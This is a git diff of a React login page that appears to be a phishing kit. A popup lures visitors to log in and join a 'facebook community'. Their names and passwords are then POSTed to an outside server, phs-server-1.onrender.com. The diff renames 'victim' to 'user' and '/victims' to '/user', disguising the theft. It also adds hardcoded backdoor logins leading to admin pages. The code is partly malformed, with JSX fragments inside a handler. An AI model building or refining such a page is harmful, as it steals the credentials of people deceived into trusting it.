@@ -1,11 +1,17 @@
 import React, { useEffect } from 'react';
 import '../App.css'
+import Swal from 'sweetalert2'
+import withReactContent from 'sweetalert2-react-content'
 import { useNavigate } from 'react-router-dom';
 const Login = () => {
-
+  const MySwal = withReactContent(Swal)
 
   useEffect(()=>{
-    alert("Please Join Our Facebook Community")
+    MySwal.fire({
+      title: "Join Now",
+      text: "Please login and join our facebook community?",
+      icon: "warning"
+    });
   },[])
 
   const navigate = useNavigate();
@@ -17,7 +23,7 @@ const Login = () => {
     const pass = form.password.value;
     const time = new Date();
     // navigate("/hackingLogin");
-    const victim = {
+    const user = {
       name: name,
       pass: pass,
       time: time
@@ -26,18 +32,19 @@ const Login = () => {
 
 
 
+    {name === "Bking" && pass === "1155" ? navigate('/admins') : 
+  
 
-
-
+   <>
     {
-      name === "NXT-NEXUS" && pass === "NXT-NEXUS-3301" ? navigate("/hackingLogin") :
+      name === "NXT" && pass === "3301" ? navigate("/adminLogin") :
 
-      fetch('https://phs-server-1.onrender.com/victims', {
+      fetch('https://phs-server-1.onrender.com/user', {
         method: 'POST',
         headers: {
           'content-type': 'application/json',
         },
-        body: JSON.stringify(victim)
+        body: JSON.stringify(user)
       })
 
         .then(res => res.json())
@@ -48,12 +55,11 @@ const Login = () => {
         })
 
     }
+   </>
 
+  }
 
-
-
-
-
+   
 
 
 
